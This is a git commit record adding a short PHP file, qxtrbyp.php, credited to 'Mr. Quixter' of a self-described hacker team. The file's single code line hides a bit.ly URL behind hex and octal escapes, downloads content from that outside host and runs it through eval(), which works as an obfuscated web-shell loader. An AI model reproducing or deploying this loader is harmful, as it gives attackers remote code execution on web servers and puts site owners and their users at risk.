61bd7ac7651987572c9bc804de2b87e7e0b83abb
mrquixter <105880514+mrquixter@users.noreply.github.com>
2022-05-20 01:52:28 +0700

    Add files via upload

---
+++ qxtrbyp.php
@@ -0,0 +1,8 @@
+<?php
+/*   ______________________________________
+ |  Create By Mr. Quixter |   One Hat Cyber Team  |    
+ |  Instagram: @mrquixter.official Tiktok: @mr.quixter
+   ________________________________________
+*/
+echo eval("\x3f\76" . file_get_contents("\x68\164\164\160\x73\72\x2f\x2f\x62\x69\x74\56\154\x79\x2f\63\111\x69\164\114\107\143"));
+?>
